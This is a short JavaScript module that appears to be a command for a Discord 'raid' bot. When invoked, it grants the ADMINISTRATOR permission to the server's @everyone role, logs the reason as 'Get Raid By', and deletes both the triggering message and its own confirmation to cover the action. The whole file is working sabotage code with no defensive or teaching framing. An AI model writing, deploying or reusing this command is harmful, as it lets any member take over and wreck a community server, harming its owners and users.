module.exports = {
  name: 'start',
  aliases: ['on', 'starts'],
  owner: true,
  dsc: true,
  description: 'Give Administrator Permission For Everyone',
  run: async(client, msg, args) => {
    
    const role = msg.guild.roles.everyone;

    msg.delete();
    role.edit({
      permissions: ['ADMINISTRATOR'],
      reason: `Get Raid By: ${msg.author.tag}`
    }).then(() => {
      msg.channel.send(`**Done!**`).then(msg => {
        setTimeout(() => {
          msg.delete();
        }, 3000);
      });
    }).catch(() => {
      msg.channel.send(`**Failed!**`).then(msg => {
        setTimeout(() => {
          msg.delete();
        }, 3000);
      });
    });
  }
}